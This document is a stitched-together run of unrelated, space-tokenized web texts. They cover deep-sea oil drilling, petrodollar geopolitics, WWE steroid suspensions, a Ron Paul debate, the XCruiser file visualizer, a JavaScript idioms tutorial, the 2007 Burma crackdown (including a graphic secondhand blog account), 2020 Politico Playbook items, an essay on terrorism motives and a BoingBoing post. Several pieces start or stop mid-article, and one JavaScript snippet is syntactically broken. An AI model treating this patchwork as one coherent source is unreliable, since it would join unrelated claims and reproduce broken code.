The thrusters constantly push and pull , doing an extreme version of what you do if you 're standing in shallow ocean water : constantly shifting your weight to stay balanced as the waves ebb and flow .
Dropping a drill down through more than 1 mile of water and 4 miles of earth is n't easy either .
The drill string is composed of hundreds of 90 - foot sections known as joints that are dropped into the water by an automated mechanical arm and successively screwed into each other .
It took more than three days to assemble all the joints in the drill string that pierced the Jack field .
Once the rotating drill bit begins its journey down through miles of sediment and pierces the seafloor , it encounters another set of problems caused by the changing terrain .
The test well for the Jack field drilled through nearly a dozen geological layers — ranging from hard bedrock to sandy sediment to empty voids .
These rapid shifts from one level of pressure to another can disturb the rotations of the drill , causing it to get stuck or veer off course .
Pressure is good — it's what naturally forces the liquid crude up the length of the well and into the barges and pipelines that send it back to shore .
( The layer of shale over the oil - bearing sands acts like a brick on top of a water balloon — the fluid wants to surge upward . )
But , at the very bottom , farther below sea level than Mount Everest is above it , there 's enough pressure to implode a human head — or , more pertinently , to crack iron casings .
Moreover , the closer you get to Earth 's core , the higher the temperature of the rocks .
At 20,000 feet below seabed , the oil is hot enough to boil an egg .
At 30,000 feet , it can reach more than 400 degrees Fahrenheit , hot enough to cook off into natural gas and carbon dioxide .
Meanwhile , the water at the bottom of the deep sea is at near - freezing temperatures — between 32 and 34 degrees — creating a dangerous interaction :
When the boiling - hot oil hits the freezing - cold water , it could solidify and block the flow , rupturing the pipes .
The machinery on the seafloor , therefore , has to be well insulated .
Engineers on the Cajun Express have been relying on a fairly primitive method — pumping the casing and substations with antifreeze — but much more sophisticated systems are in the works .
Because so many of the challenges that engineers encounter in the ultradeep can't be anticipated — or found anywhere else — the Jack test rig was populated with so - called Serial Number 001 technologies : one - of - a - kind innovations ranging from perforation guns that are triggered at well bottom inside the casing , creating holes that let the oil gush in and flow upward , to electrohydraulic systems that seal the wells in emergencies .
And yet sometimes the solution is plain old creative thinking and duct tape .
For example , when a tool got stuck down the hole during one well test , someone suggested just banging a giant hammer against the casing , sending vibrations down that jarred the tool loose .

Photo : Michael Sugrue__As consensus grows __that the world needs to shift away from fossil fuels , extracting oil from the most extreme and costly locations can seem foolishly myopic .
If Chevron is going to throw billions of dollars into something untested and possibly doomed to failure , would n't it make more sense to invest in an inexhaustible , greener technology that 's going to have political support a decade from now ?
Siegele does n't think so .
He does know that geological limitations will prevent him from drilling much deeper :
It 's a pretty safe bet that below 40,000 feet , the extreme heat has baked off much of the deep - sea troves of crude .
And there are financial limits to this frontier , too .
Even as Chevron and other oil giants earn record profits , they also face record expenses .
For example , the company has commissioned two new deep water rigs that will be able to drill 40,000 - foot wells .
But at more than $ 600 million each , they can't exactly be snapped up on boats.com .
" The costs of developing a new oil or gas project are about 65 percent higher today than 30 months ago , and the greatest escalation of costs has been offshore , " says Daniel Yergin , chair of the consulting firm Cambridge Energy Research Associates .
At today 's oil prices of $ 70 a barrel , the current exploration makes sense .
But if oil drops below $ 40 a barrel , Yergin says , the cost of exploring this high - risk frontier will become prohibitive .
But Siegele is hardly worried .
Technological breakthroughs have , decade after decade , revived the perpetually doomed oil industry .
" Predicting peak oil , " Siegele tells me as we tour the drilling floor of the Cajun Express , " is almost like predicting peak technology " — an exercise , in other words , that to him seems inherently small - minded .
Even absurd .
Siegele takes me to the " crown " of the Cajun Express , a harrowing widow 's walk suspended at the top of the drill 's 200 - foot derrick .
The rig below looks like the loneliest place on Earth — a tiny , solitary board floating in a boundless blue sea .
Then , out in the distance , I spot fleets of trawlers the size of thumbnails setting off seismic guns in search of the next big deep - sea prospect .
" A decade ago , I never even dreamed we'd get here , " Siegele marvels .
" And a decade from now , this moonscape could be populated with rigs as far as the eye can see . "

Geopolitics Here We Go : Russia Challenges Petrodollar Hegemony By Ryan McGreal
Published April 23 , 2006
According to yesterday 's Telegraph , Alexei Kudrin , the Russian finance minister , challenged petrodollar hegemony during the annual meetings of the World Bank and the International Monetary Fund ( IMF ) .
The article reports :
The greenback 's recent volatility and the yawning US trade deficit , " are definitely causing concern with regard to its reserve currency status , " he said .
" The international community can hardly be satisfied with this instability . "
At the same time , the G7 ( which does not include Russia ) is debating how to address inflation triggered by rising oil prices .
As Andrew McKillop observes in his recent RTH essay , the monetarists running our finance departments and central banks are responding by raising interest rates .
The author reminds us , " The US Federal Reserve , in particular , has been forced to take drastic action - raising interest rates 15 times since June 2004 to keep inflation in check . "
Russia senses an opportunity to shift power away from America , which is struggling with an historically high government deficit and debt ( the highest since WWII ) and a massive current accounts deficit .
Today , US dollars and treasury securities make up over two thirds of global reserve holdings , mainly because governments needs US dollars to buy oil .
As the price of oil has tripled in the past half - decade , the global demand for US dollars has only escalated , allowing America to import over $ 700 billion more than it exported last year .
This situation is tenable only as long as the world continues to use dollars to buy oil .
According to the report , " The unprecedented weight of US liabilities means a threat to the dollar 's dominance could result in a currency collapse , plunging the world 's largest economy into recession . "
Central banks are already starting to reduce their exposure to US currency .
Sweden , for example , recently cut its dollar holdings from 37 percent of its reserves to 20 percent , increasing its holdings of euros .
Russia , a major global player in oil and natural gas production , is positioning itself to take advantage of America 's vulnerability .
Part of that strategy will surely be to introduce the euro as an alternate petroleum trading medium .
Europe is Russia 's biggest customer , and its economy is similar in scale to America's .
The difference is that Europe 's economic fundamentals are sound .
Kudrin's announcement is an opening salvo in a struggle to shift the centre of the world 's political economy away from the US and toward Eurasia , which has most of the world 's people and most of the world 's remaining resources .
RTH has written before about Iran 's plan to introduce a petroleum exchange denominated in euros .
Iran 's plan to launch it in March has been delayed until later in the year , and as American anti-Iranian rhetoric continues to ratchet up , the pressure on Iran to abandon its plan altogether continues to rise .
Russia is now applying pressure in the opposite direction .
As the Telegraph notes :
It is worth noting that Tehran has ongoing plans to set up an oil trading exchange to compete with New York 's NYMEX and with London 's International Petroleum Exchange .
In the light of Kudrin 's comments , it is significant that the Iranians want to run their oil bourse in euros , not dollars .
Were the Iranians to establish a Middle - East based euro - only oil exchange , the dollar 's unique petrocurrency status could unravel .
That , in turn , would threaten its broader dominance - which , given America 's groaning twin deficit , could seriously hurt the US economy .
The author stops short of arguing that the oil bourse is " the real reason the US wants to atack Iran " , but notes that the plan " is certainly an aggravating factor " .
The author concludes that " the US currency will retain its hegemony " only to the extent that it retains its privileged position as the medium of exchange for OPEC oil .
Kudrin has broken the seal on a growing sentiment among other countries that the best way to preserve a stable global economy is to reduce global exposure to an unstable dollar .
Kudrin 's missive comes as central bankers , and currency dealers , start to conclude the only way to resolve the massive US external deficit is a somewhat weaker US currency .
As the IMF itself warned yesterday , a " substantial " dollar decline may be needed .
An idea that has drifted around the margins of international discussion is finally out in the open .
America has to decide whether it wants to work with the rest of the world to distribute economic power more evenly between the dollar and the euro , or whether it wants to squander the last of its hegemonic power on a desperate , and ultimately futile , gambit to remain in control .

World Wrestling Entertainment , under fire since one of its top stars was involved in a double - murder suicide , announced the suspension of 10 of its wrestlers on Thursday .
They are being suspended for violating the WWE's " wellness policy . "
The move comes as investigators from the Albany , N.Y. , district attorney 's office have been gathering information about steroid use by WWE wrestlers as part of a wide ranging investigation into online pharmacies and the doctors who write prescriptions for them .
WWE did not release the names of those suspended .
A source close to the investigation said that WWE was told that the following wrestlers were among the clients of one of the pharmacies under investigation , Signature of Orlando : Shoichi Funaki , Dave Bautista , Adam " Edge " Copeland , Chris " Masters " Mordetsky , John " Johnny Nitro " Hennigan , and Shane Helms .
Chris Benoit , the wrestler who killed his wife and son before hanging himself in June , was also a Signature client , as were two other wrestlers who recently died , Eddie Guerrero and Brian " Crush " Adams .
The Albany district attorney 's office is examining online prescription mills where doctors get paid as little as $ 25 to issue online prescriptions , which in turn are filled by friendly pharmacies .
In addition to Signature , its investigators raided pharmacies in Mobile , Ala . and Bay Ridge , N.Y .
Among those who have pleaded guilty are a Florida doctor named Claire Godfrey , who has admitted to prescribing performance - enhancing drugs at least two WWE wrestlers .
In exchange for a plea that will keep her out of prison , she is cooperating with prosecutors .
The suspensions , which were accompanied by a WWE pledge to make future actions public after Nov. 1 , comes at a time of mounting pressure on the WWE .
A spokesman for the House Energy & Commerce Committee said Thursday that its commerce subcommittee will be holding hearings into the WWE in late September .
The aide said a witness list has not been finalized .
Also looking into the company is the House Committee on Oversight and Government Reform .
In a request that parallels what was asked of Major League Baseball , the committee is seeking a list of drugs covered by the WWE 's policies , the number of tests it conducts annually , the protocols followed after a positive test and the procedures for awarding exemptions .
The issue of steroids and WWE largely faded until late June , when Benoit killed his wife and son in their suburban Atlanta home before hanging himself .
His body was found to have 10 times the normal level of testosterone , as well as the anti-anxiety drug Xanax and the painkiller hydrocodone , authorities said .
The WWE instituted its current drug testing policy after the November 2005 death of Benoit 's best friend , Guerrero , 38 , who was found dead in a hotel room in Minneapolis .
On Aug. 15 , a day before WWE officials met with the Albany prosecutors , Adams , 44 , was found dead of undetermined causes in his Florida home .
Toxicology tests are pending .
The WWE has insisted that it randomly tests its 180 athletes at least four times a year .
Shaun Assael is a senior writer for ESPN The Magazine .
He is also the co-author of " Sex , Lies , and Headlocks : The Real Story of Vince McMahon and World Wrestling Entertainment , " which is available here .
His second book , Steroid Nation , will be released in October .
It ’s time , she stays , to stop laughing at Ron Paul and start debating him :
The debate was full of fireworks about Iraq , about its essentials –the rightness of the endeavor , and what should rightly be done now .
From the libertarian Ron Paul a blunt argument against the war :
We never should have gone in and we should get out .
“ The people who say there ’ll be a blood bath are the same ones who said it would be a cakewalk .
. . .
Why believe them ? ”
His foreign policy : “ Mind our own business , bring our troops home , defend our country , defend our borders . ”
After Mr. Paul spoke , it seemed half the room booed , but the other applauded .
When a thousand Republicans are in a room and one man of the eight on the stage takes a sharply minority viewpoint on a dramatic issue and half the room seems to cheer him , something ’s going on .
Ron Paul ’s support is n’t based on his persona , history or perceived power .
What support he has comes because of his views .
As he spoke , you could hear other candidates laughing in the background .
They should stop giggling , and engage in a serious way

XCruiser -0.30 is released .
( Feb. 3 , 2003 )
What is XCruiser ?
XCruiser , formerly known as XCruise , is a filesystem visualization utility .
It constructs a virtually 3 - D formed universe from a directory tree and allows you to " cruise " within a visualized filesystem .
The original idea came to me when I was a university student .
I heard that tree - like filesystems are not necessarily best for us since we often remember the location of objects with spatial hints .
I was inspired by this idea and developed XCruiser .
I wish that someone create more user - friendly interfaces based on this program .
Analogies in XCruiser
Directories : Galaxies
A directory is represented as a galaxy , displayed as a cyan or white ring in XCruiser .
Unlike the actual universe , a galaxy may contain other galaxies to represent hierarchical directories .
Files : Planets
A regular file is represented as a planet .
The radius of a planet is determined by its mass , which corresponds to the file size .
The color is currently kind of random , but we 're planning to relate it to the file type .
Symbolic links : Wormholes
A symbolic link is represented as a wormhole , displayed as a green curve .
The Location of Files ( Stars ) The position and the direction of a file ( star ) is determined by its file name .
Longer filenames are located farther from the center of the parent galaxy .
Closer filenames are located in closer places to each other .
Yusuke Shinyama ( yusuke at cs . nyu . edu )
JavaScript , with its death grip on the Interwebs and every AJAX developer 's language of only choice , is getting hot .
With roll - overs , pop-ups , and menus either solved or relegated to CSS behaviors , XMLHttpRequest s have made JavaScript once again a language of innovation .
This article is meant to offer a tidbit of idiomatic advice for people who know JavaScript or want to know JavaScript coming from Java , C , Python , Perl , or PHP .
Novice : objects and associative arrays
Coming from Java , you might expect JavaScript to provide a base type , like Object .
Coming from most languages , you might expect JavaScript to provide a dictionary , hash - table , or associative array type like Perl 's % hash type , Python 's dict type , PHP 's array type , or Java 's Map interface .
JavaScript kills two birds with one stone , and I mean knocks them both dead .
Object is the common , ancestral prototype of most instances .
They are also used for String to Object mappings .
JavaScript provides a shorthand syntax for Object initialization , much like Perl and Python associative arrays .
var foo = new Object ( ) ; var foo = {} ;
Also , item indexing and member selection are equivalent .
foo . a == foo [ ' a ' ] ;
Since you can only use String s as keys , indexing an Object on another Object implies that JavaScript will convert the index to a string using toString .
foo [ 1 ] == foo [ ( 1).toString ( ) ] == foo [ ' 1 ' ] ;
If you need a real hash mapping like Python or Java , you should find a library that provides one .
Since JavaScript implementations do n't all provide a mechanism for overloading item indexing ( nor an equivalent property system like Python 's or Ruby's ) and no JavaScript implementation provides a default hash algorithm for objects , a good library will provide an associative array type that includes functions like getItem , setItem , hasItem , and delItem , and a general hash algorithm that returns good default hashes for every built - in type and uses polymorphic hash member functions .
Novice : cute type conversions
JavaScript provides valueOf and toString member functions for all objects .
However , literal numbers , booleans , strings , undefined , and null are distinct from their object counterparts .
For example , typeof new Number ( 1 ) == ' object ' whereas typeof 1 == ' number ' .
However , there are some cute ways to implicitly and reliably convert any object to a literal number , literal boolean , or literal string .
You can convert any object to a number by adding it to zero .
0 + foo
You can convert any object to a string by adding it to a null string .
'' + foo
However , strings and numbers are special .
If you add a string and a number , the resultant type depends on whether the string is empty .
An empty string gets coerced to the number zero .
Otherwise , the zero gets coerced to a string and the addition performs concatenation .
0 + '' == 0 '' + 0 == 0 1 + '' == 1 '' + 1 == 1 0 + ' a ' == ' 0a ' ' a ' + 0 == ' a0 '
You can convert any object to a boolean , true or false value by negating it twice .
!!foo
Novice : iteration
Coming from Java or C , JavaScript has a fun variation on the for loop .
Coming from Perl , PHP , or Python , the familiar for loop has a subtle quirk .
You can use a for loop to run a block repeatedly , once through for each member ( items. member ) and item ( items [ ' item ' ] ) of an Object .
The iterand will be the index of the item , not the item itself .
for ( var index in items ) { var item = items [ index ] ; ... }
You should use a traditional , C - style for - loop for iterating Array objects .
Bearing in mind that , in JavaScript , members and items are equivalent , the for loop will iterate over both numeric indices and named members , with the exception of built - in members like toString or exec .
Some libraries controversially add member functions to the Array prototype .
Sometimes this causes the for ( var i in array ) to iterate on these member functions in addition to the numbers .
This is the pattern you should use to avoid getting member functions when you iterate on an Array :
for ( var i = 0 ; i < items.length ; i++) { var item = items [ i ] ; ... }
Of course , these libraries and new browsers also provide alternate iteration mechanisms that are arguably more elegant .
With recent versions of Firefox and libraries like Prototype , you get forEach iteration , which involves an anonymous function .
items.forEach ( function ( item ) { ... } ) ;
Acolyte : anonymous functions
The redeeming grace of JavaScript is its provision of anonymous functions with full closures .
In JavaScript , functions are objects .
Programmers can pass functions as arguments .
Furthermore , the function 's scope includes all of the names in the scope in which it was declared .
Coupled with the facts that functions are declared at run time and that local variables can stick around long after a function returns , closures provide a wealth of options for programmers .
An exhaustive compendium of all the fun uses for closures would be far beyond the scope of this article , so here 's a canonical example for you to ponder : a range generator .
var range = function ( start , stop , step ) { return function ( ) { var at = start ; start += step ; if ( at < stop ) return at ; else throw new Error ( ) ; } ; } ; var next = range ( 0 , 10 , 2 ) ;
The first call of next returns 0 .
The following times you call next it returns 2 , 4 , 6 , and 8 .
Thereafter , calling next will throw an Error .
This is because the local variables of range , the one time you 've called it , remain in memory as long as next exists .
The anonymous function that range returns is a closure : both the code of the function and a reference to the scope in which the function was declared .
The returned function object effectively holds the range " function allocation record " in memory .
Thus , the value of start persists across calls to next .
Acolyte : enclosure
In JavaScript 's top scope , variables you declare with var are members of the window .
To get a bit more privacy with your variables , you should use a closure by declaring an anonymous function and immediately calling it .
Since calling functions can have unfortunate side - effect of switching your context object to the global context , use call to send this into your closure .
( function ( ) { ... } ) .call ( this ) ;
Another handy use for enclosures is to make using with and var behave deterministically and intuitively .
The with block pushes an Object onto the scope chain .
That is , members of a given object become local variables in the given block .
with ( { ' a ' : 10 } ) { a == 10 ; }
However , when you declare variables with var inside a with block , the variables should be declared in the function block scope and a variable by the same name should be initialized in the with block scope .
However , all bets are off depending on what browser runs the script .
Using an enclosure inside all with blocks will force var declarations to operate in the innermost scope .
with ( { ' a ' : 10 } ) { function ( ) { var a = 20 ; } ) .call ( this ) ; }
Acolyte : context object manipulation
JavaScript provides a context object , this .
In the global context , this is the window .
Also , by default , this is the window when you call a function .
var bar = function ( ) { return this } ; bar ( ) == window ;
There are two ways to send other objects as the context object into a function .
The first is to call a function as a member of an object .
var foo = { ' bar ' : bar } ; foo.bar ( ) == foo ;
The second way to send an object to a function as its context object is explicit .
You can use the Function . call method 's first argument to send in an arbitrary object .
call accepts the context object followed by any arguments you want to pass in normally .
bar.call( foo , 0 , 1 , 2 , ... ) ;
Acolyte : variadic arguments
Coming from C , variadic arguments are the va_arg and ... syntax trick left over from ANSI C that allow functions like printf to accept an arbitrary number of arguments .
In Python , you get variadic arguments and keywords using * and ** in your declarations and invocations .
In JavaScript , like Perl , functions implicitly accept any number of arguments .
You can access these variadic argument lists using the arguments variable inside your functions .
Consider a trivial max function that returns the largest of two numbers .
this .max = function ( a , b ) { if ( a > b ) return a ; else return b ; } ;
max can use the arguments to read any number of arguments .
this .max = function ( ) { var items = arguments ; var basis ; for ( var member in items ) { var item = items [ member ] ; if ( basis === undefined || item > basis ) { basis = item ; } } ; return basis ; } ;
If you want to pass variadic arguments to a function from an arbitrary number of items in an Array , you can use the Function . apply function .
Like call , apply accepts the context object as its first argument , followed by a single Array containing whatever arguments to you want to pass .
max.apply ( this , [ 10 , 30 , 20 ] ) == 30 ;
Guru : binding
You 've likely noticed that the context object a function receives depends on the invocation syntax .
Binding a function to an object assures that you receive a particular object .
Here 's a sample bind function .
var bind = function ( context , functor ) { return function ( ) { return functor .
apply ( context , arguments ) ; } ; } ;
Guru : lazy function definition
Peter Michaux recently documented and named the " Lazy Function Definition Pattern " wherein you determine the behavior of a function the first time the user calls it .
This is handy for choosing among cross - platform code paths .
Consider this function that gets the value of PI by calculating it once , then simply returning it after each successive call .
var get Pi = function ( ) { var pi = calculate Pi( ) ; get Pi = function ( ) { return pi ; } return pi ; } ;
Guru : polymorphic callable objects
Supposing you were writing a type system , you might want objects of all your types to have the option of being callable , and for the call behavior to be redefinable in sub -types .
One fun way to do this is to always use Function instead of Object as your base type .
var callableType = function ( constructor ) { return function ( ) { var callable Instance = function ( ) { return callableInstance.callOverload.apply(callableInstance , arguments ) ; } ; constructor.apply ( callableInstance , arguments ) ; return callableInstance ; } ; } ;

Firms Seek Access to Burma Oil Fields Despite Bloody Crackdown
By Thomas Hogue / AP Writer / Bangkok
September 29 , 2007 — Just last Sunday — when marches led by Buddhist monks drew thousands in Burma ’s biggest cities — Indian Oil Minister Murli Deora was in the country ’s capital for the signing of oil and gas exploration contracts between state - controlled ONGC Videsh Ltd and Burma ’s military rulers .
The signing ceremony was an example of how important Burma ’s oil and gas resources have become in an energy - hungry world .
Even as Burma ’s military junta intensifies its crackdown on pro-democracy protests , oil companies are jostling for access to the country ’s largely untapped natural gas and oil fields that activists say are funding a repressive regime .

Myanmar : Monks besieged ; Internet cut
Sniper found not guilty of murdering two Iraqis
YANGON , MYANMAR – Soldiers and police took control of the streets Friday , firing warning shots and tear gas to scatter the few pro-democracy protesters who ventured out as Myanmar ’s military junta sealed off Buddhist monasteries and cut public Internet access .
On the third day of a government crackdown , the streets were empty of the mass gatherings that had peacefully challenged the regime daily for nearly two weeks .
“ Bloodbath again ! Bloodbath again ! ” a Yangon resident yelled while watching soldiers break up one march .
Burma : From comment on Ko Htike ’s Blog
28 September 2007 19:17
“ We just got phone call with our sister living in Yangon about a few hours ago .
We saw on BBC world , saying that 200 monks were arrested .
The true picture is far worse !!!!!!!!!
For one instance , the monastery at an obscure neighborhood of Yangon , called Ngwe Kyar Yan ( on Wei - za - yan - tar Road , Yangon ) had been raided early this morning .
A troop of lone - tein ( riot police comprised of paid thugs ) protected by the military trucks , raided the monastery with 200 studying monks .
They systematically ordered all the monks to line up and banged and crushed each one ’s head against the brick wall of the monastery .
One by one , the peaceful , non resisting monks , fell to the ground , screaming in pain .
Then , they tore off the red robes and threw them all in the military trucks ( like rice bags ) and took the bodies away .
The head monk of the monastery , was tied up in the middle of the monastery , tortured , bludgeoned , and later died the same day , today .
Tens of thousands of people gathered outside the monastery , warded off by troops with bayoneted rifles , unable to help their helpless monks being slaughtered inside the monastery .
Their every try to forge ahead was met with the bayonets .
When all is done , only 10 out of 200 remained alive , hiding in the monastery .
Blood stained everywhere on the walls and floors of the monastery .
Please tell your audience of the full extent of the fate of the monks please please !!!!!!!!!!!!
‘ Arrested ’ is not enough expression .
They have been bludgeoned to death !!!!!! ”

THE JEFF ZUCKER EFFECT … NYT ’S MIKE MCINTIRE , RUSS BUETTNER and SUSANNE CRAIG : “ How Reality - TV Fame Handed Trump a $ 427 Million Lifeline ” : “ Months after [ the ] inaugural [ ‘ Apprentice ’ ] episode in January 2004 , Mr. Trump filed his individual tax return reporting $ 89.9 million in net losses from his core businesses for the prior year .
The red ink spilled from everywhere , even as American television audiences saw him as a savvy business mogul with the Midas touch . …
“ By analyzing the tax records , The New York Times was able to place a value on Mr. Trump ’s celebrity .
While the returns show that he earned some $ 197 million directly from ‘ The Apprentice ’ over 16 years — roughly in line with what he has claimed — they also reveal that an additional $ 230 million flowed from the fame associated with it . ”

THE OLD COLLEGE TRY : “ Pelosi and Mnuchin make one final attempt at Covid talks before elections , ” by Sarah Ferris , Heather Caygle and John Bresnahan : “ Pelosi and Mnuchin spoke Monday evening , according to Drew Hammill , Pelosi ’s spokesman , and they plan to speak again Tuesday morning .
If no agreement seems likely -- and it has n’t been despite months of on - and - off negotiations -- Pelosi and House Democratic leaders will hold a vote on their own $ 2.2 trillion bill as soon as Wednesday and then go home , guaranteeing that Congress wo n’t send more help until after Election Day , said the sources . ”
-- WELL , YOU KNOW WHERE WE STAND on the prospects of this .
Could a deal come together ?
Sure .
It would require a massive capitulation on one side .
We checked with a few very senior White House aides late Monday evening , and their view was if they are forced to negotiate off of PELOSI ’S new , $ 2.2 trillion bill , this latest round of talks does n’t stand much of a chance .
-- REMEMBER :
The two sides remain $ 1 TRILLION apart .
Republicans ’ topline has been $ 1.3 trillion to $ 1.5 trillion , and Dems have been hovering in the $ 2.2 trillion to $ 2.4 trillion range .
THE NEXT CRISIS ? --
“ Thousands of aviation layoffs loom amid a dysfunctional Congress , ” by Sam Mintz : “ Tens of thousands of airline workers will lose their jobs in a matter of days if Congress is unable to break through its gridlock , even though a majority of lawmakers support heading off the looming layoffs for an industry that ’s been decimated by the coronavirus .
“ Airline unions have been pleading with Congress for months to extend the Payroll Support Program , a $ 32 billion program of airline payroll support grants given as part of the CARES Act , a condition of which required that airlines not involuntarily lay off workers until after Sept. 30 .
Without extending the program , which will require a $ 28 billion cash infusion , airlines say they will have to start laying off pilots , flight attendants , mechanics and more .
“ At least some percentage of those workers , in virtually every community across the country , will head to the unemployment office — right before the November election .
But so far , no aid appears to be coming from Capitol Hill , absent a last - ditch effort . ”

CORONAVIRUS LATEST … AP : “ Worldwide grief : Death toll from coronavirus tops 1 million , ” by Adam Geller and Rishabh Jain with a New Delhi dateline
FIRST IN PLAYBOOK -- Let America Vote and Brady PAC are launching a $ 1.1 MILLION ad campaign as part of the # SavetheVote campaign to educate people about voting .
The mail and digital ads will focus on Democratic - leaning , low - propensity voters in Michigan , North Carolina , New Hampshire , Pennsylvania and Texas through Election Day , including Black , Asian and Latino voters .
The ads : “ No Secret ” … “ Easy , Safe , and Secure ” … “ Change ” ( N.C. )
STATE OF PLAY -- “ They wanted disruption in 2016 .
Now they ’re Trump defectors , ” by AP ’s Tamara Rush : “ Trump ’s case for reelection rests almost solely on the intensity of support from those who backed him four years ago .
Unlike other modern presidents , he has done little to try to expand his base , and there ’s no evidence that he has .
So he cannot afford to lose many voters like [ Shawna ] Jensen .
“ It ’s unclear how many voters like Jensen are out there — white , middle - class people who are pro-gun and anti-abortion rights , solid Republicans in most conventional ways — and how they will affect the election ’s outcome .
Voters like Jensen could be only a slice of the electorate , but they still represent a flashing caution sign for the president .
“ Trump ’s support among Republicans has been stable throughout his time in office .
For all those voters repelled by Trump , there are diehard legions who remain solidly with him because they believe he honored his campaign promises , shows strengths and has presided over an economy that was flourishing before the pandemic .
In a tight race — especially in swing states — those who are abandoning Trump could make a difference . ”
-- WAPO : “ Courts view GOP fraud claims skeptically as Democrats score key legal victories over mail voting , ” by Elise Viebeck : “ A review by The Washington Post of nearly 90 state and federal voting lawsuits found that judges have been broadly skeptical as Republicans use claims of voter fraud to argue against such changes , declining to endorse the GOP ’s arguments or dismissing them as they examined limits on mail voting .
In no case did a judge back President Trump ’s view — refuted by experts — that fraud is a problem significant enough to sway a presidential election . ”
MELANIE ZANONA and ALLY MUTNICK : “ House Republicans work to close gender gap despite Trump headwinds ” : “ House Republicans will boost their depressingly low number of congresswomen next year — it 's just a matter of how much .
Reeling from a brutal midterm election that decimated their ranks , the remaining female GOP members corralled party leaders , donors , and outside groups into mounting an all - out campaign to close the gender gap by recruiting more women and shepherding them through primaries .
“ On a good election night for the party , they could see as many as two dozen women win their races , bringing them back to their pre-2018 levels .
In the worst - case scenario , House Republicans would still grow their female ranks by one or two .
“ More than that , though , the GOP — which has long shunned identity politics , at least when it comes to gender — has experienced a real attitude and cultural shift around electing more women to Congress , according to interviews with over a dozen lawmakers , candidates , operatives and aides .
Women are stepping up to run , citing their gender as an asset and answering the siren sounded by party leaders — even as President Donald Trump remains divisive among women of both parties . ”

DEEP DIVE -- “ Behind the White House Effort to Pressure the C.D.C. on School Openings , ” by NYT ’s Mark Mazzetti , Noah Weiland and Sharon LaFraniere : “ Top White House officials pressured the Centers for Disease Control and Prevention this summer to play down the risk of sending children back to school , a strikingly political intervention in one of the most sensitive public health debates of the pandemic , according to documents and interviews with current and former government officials .
“ As part of their behind - the - scenes effort , White House officials also tried to circumvent the C.D.C. in a search for alternate data showing that the pandemic was weakening and posed little danger to children .
The documents and interviews show how the White House spent weeks trying to press public health professionals to fall in line with President Trump ’s election - year agenda of pushing to reopen schools and the economy as quickly as possible .
The president and his team have remained defiant in their demand for schools to get back to normal , even as coronavirus cases have once again ticked up , in some cases linked to school and college reopenings .
“ The effort included Dr. Deborah L. Birx , the White House ’s coronavirus response coordinator , and officials working for Vice President Mike Pence , who led the task force .
It left officials at the C.D.C. , long considered the world ’s premier public health agency , alarmed at the degree of pressure from the White House . ”

The numbers are n’t much better on the rungs of the ladder leading to that role .
Among all U.S. companies with 100 or more employees , Black people hold just 3 % of executive or senior - level roles , according to Equal Employment Opportunity Commission data .
Decades after the civil - rights movement led to laws banning workplace discrimination , progress for Black executives has hit a ceiling . ”

Why They Really ' Hate Us ' Editor 's Note : One of George W. Bush 's key propaganda arguments for the Iraq War and other U.S. military interventions in the Middle East is that Islamists are on the offensive against the West -- and would " follow us home " if U.S. forces were withdrawn .
In this guest essay , the Independent Institute 's Ivan Eland contends that Bush and his neoconservative advisers have turned reality inside out , ignoring that a key motive for the Islamists is their perception that the United States has designs on Muslim lands :
When U.S. government officials and foreign policy pundits discuss terrorism , they usually focus on the characteristics , personnel , history , tactics , targets , objectives and effects of terrorist organizations .
They rarely talk about motives .
Bookmark
Digg Email

To fully understand Islamic terrorism , one needs to understand what triggers this extraordinary rage .
And throughout history one factor stands out above all else : the occupation of Muslim land by non-Muslim forces .
From the time of the Crusades , the pattern has been consistent .
The Soviet Union learned this difficult lesson following its invasion and occupation of Afghanistan in the late 1970s .
The Russians learned it again when they occupied Chechnya in the 1990s .
Israel ’s occupation of the West Bank and Gaza after the 1967 Six Day War and its military interventions in Lebanon triggered similar reactions , as did the U.S. military presence in Lebanon in the early 1980s .
Indeed , it ’s fair to say that Israel ’s very existence — a non-Islamic state in land claimed by the Muslims — is part of the same pattern , as is the U.S. occupation of Iraq and Afghanistan .
There is much the United States could do to defuse the problem , and a good place to start would be by removing land - based U.S. forces from the Persian Gulf .
Even Osama bin Laden claims he attacks the United States primarily because of its military presence in the region .
Other reasons , he claims , are secondary .
Remember , bin Laden first went to war not against the United States , but against the Soviets in Afghanistan .
When he returned to his Saudi Arabia homeland after fighting the Soviets , he found a large -- and to him unacceptable -- U.S. military presence in the desert kingdom , which remained after evicting Saddam Hussein from Kuwait .
It was then that the United States became a target .
During the Cold War , one could make a plausible argument for some U.S. involvement overseas to counter the expansionist Soviet superpower .
When the Soviet Union collapsed , that rationale disappeared .
Even if the United States believes the global oil market will fail to deliver Persian Gulf oil to U.S. shores without U.S. military forces protecting it ( a dubious proposition ) , the U.S. military could protect our oil lifeline from offshore , without troops stationed in Muslim countries .
The United States has done so before .
In 1991 , when the George H.W. Bush administration believed U.S. oil supplies were endangered by Saddam Hussein ’s invasion of Kuwait , U.S. - based land and air forces were sent to the Gulf to push Saddam out of Kuwait .
After the job was done , those forces should have been brought home .
Instead , the United States established a large military footprint in the region , which , in retrospect , was exactly the wrong move .
Now it ’s time to get rid of that unneeded land presence , not to increase the ante by talking about permanent U.S. bases in Iraq .
Just look at the troubles the United States has caused in Afghanistan .
There , the continued U.S. occupation — which has changed its main focus from killing or capturing bin Laden to nation - building , counterinsurgency , and drug interdiction — is fueling a resurgence of the Taliban movement .
Only by minimizing the permanent U.S. military presence in Arab and Islamic lands can we hope to stem anti-U.S. terrorism .
The United States should withdraw its forces from Afghanistan , inform the Afghans that U.S. forces will return if any Afghan government harbors al Qaeda , and use Special Forces to hunt down al Qaeda ’s leadership .
This process needs to be repeated in Iraq and the Persian Gulf .
The lesson learned is that empire does not enhance security -- it undermines it .
U.S. power on Islamic soil is especially problematical .

BoingBoing readder Cristóbal Palmer responds to a recent BB post about Tactical Usage of the phrase " Oh Snap ! " , and says :
My own flowchart .
Starts with the question , " Is it fucked up ? " and goes from there .
Did this a long time ago .
Original version I did here , blog post I just posted with more legible , updated version here .
Reader comment : Michael says ,
I saw a variation of this diagram on the door of the men's room in the Texas Chili Parlor in Austin a few years back .
Nick Hatch says ,
That flowchart you posted seems to be heavily inspired by this one from the book Antarctica by Kim Stanley Robinson , published in 1997 .
I could n't find a copy online , but I have a scan of it that I attached .
Mark says ,
There was a copy of that flowchart ( minus the miracle / prayer bit , that 's new ) on one of the lockers of the technical theater majors in the dank corridors underneath the University of North Carolina at Greensboro 's Aycock Auditorium .
That was when I was still a technical theater major , many many moons ago , so it would be either Fall 1991 or Spring 1992 .
